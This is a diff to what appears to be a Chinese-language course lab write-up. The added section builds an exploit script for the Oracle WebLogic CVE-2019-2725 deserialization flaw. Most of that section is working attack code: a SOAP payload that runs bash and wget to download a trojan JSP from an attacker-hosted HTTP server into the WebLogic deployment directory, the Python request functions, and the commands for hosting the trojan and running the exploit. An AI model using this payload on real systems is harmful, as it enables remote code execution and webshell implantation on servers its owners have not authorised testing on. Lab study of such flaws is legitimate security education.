@@ -561,7 +561,7 @@ python3 poc.py -f IP_test.txt -p
 
 检测出存在`CVE-2019-2725`漏洞
 
-#### 智能化漏洞攻击脚本
+#### 智能化漏洞攻击方案
 
 ##### struts2-cve-2020-17530脚本构造
 
@@ -600,3 +600,132 @@ Getshell脚本的反弹命令需要进行进行编码转换，所以反弹shell�
 对开放端口运行脚本，成功getshell：
 
 ![finishshellattack](img/finishshellattack.jpg)
+
+##### Weblogic CVE-2019-2725 攻击脚本构造
+
+编写[**EXP代码**](./src/exp.py)
+
+首先定义HTTP请求的headers和data
+
+```python
+headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
+           'SOAPAction': 'Accept: */*',
+           'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
+           'content-type': 'text/xml'}
+data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
+xmlns:asy="http://www.bea.com/async/AsyncResponseService">
+<soapenv:Header>
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>wget {0} -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/{1}/war/3.jsp</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>'''.format(options.LOCATE, route(url + url_route + '?info'))
+
+```
+
+获取WebLogic中间件版本目录
+
+```python
+#获得weblogic中间的版本目录
+def route(url):
+  print('[*] 获得路径中')
+  try:
+    #print('[*] 目标地址:'+url)
+    respond = requests.get(url)
+    if respond.status_code == 200:
+      route = str(respond.text)
+      start = route.index('async_response/')
+      #print(start)
+      if start >= 0:
+        start += len('async_response/')
+      #print(start)
+      end = route.index('/war')
+      #print(end)
+      #print(route[start:end])
+      return route[start:end];
+    else:
+      print("[-] 路径获取失败")
+      exit()
+  except Exception as e:
+    print("[-]{0}连接失败".format(url))
+    exit()
+```
+
+实现发送HTTP请求，获得WebLogic中间件版本目录
+
+从攻击者http服务器中下载木马文件
+
+```python
+def acquire(url):
+  print('[*] 目标地址:'+url)
+  print('[*] 攻击者地址:'+options.LOCATE)
+  try:
+    respond = requests.post(url+url_route,headers=headers,data = data)
+    #print(respond.status_code)
+    if respond.status_code == 202:
+      print('[+] 木马下载成功')
+    else:
+      print('[-] 下载失败')
+      exit()
+  except Exception as e:
+    print("[-]{0}连接失败".format(url))
+    exit()
+```
+
+本地启动简易的http服务器，代理木马文件attackjsp.txt
+
+```
+python3 -m http.server 8000
+```
+
+![Starttheserverlocally](img/Starttheserverlocally.png)
+
+部署好木马服务器后执行攻击脚本
+
+```bash
+python3 exp.py -u <target_url> -p <target_port> -l <service_script>
+#<target_url> 替换为目标的URL地址，<target_port> 替换为目标的端口号，<service_script> 替换为服务脚本的位置。
+```
+
+![expattacker](img/expattacker.png)
+
+木马服务器显示收到请求
+
+![mumafuwuqi](img/mumafuwuqi.png)
+
+此时查看受害者服务器中是否下载了木马程序
+
+```bash
+docker ps
+docker exec -it ec8fb7023c85 bash
+
+cd user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war
+```
+
+![findjsp](img/findjsp.png)
+
+### 🔍参考材料
+
+- [网络安全(2021)综合实验](https://www.bilibili.com/video/BV1p3411x7da/?p=22&spm_id_from=pageDriver&vd_source=61a1cf010feeebc60643481f16fc695e)
+- [cuc-ns-ppt](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/title-slide)
+
+- [Vulfocus 镜像维护目录](https://github.com/fofapro/vulfocus/blob/master/images/README.md)
+- [关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告（第二版）](https://www.cnvd.org.cn/webinfo/show/4999)
+- [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)
+- [Long Term Persistence of JavaBeans Components: XML Schema](https://www.oracle.com/technical-resources/articles/java/persistence3.html)
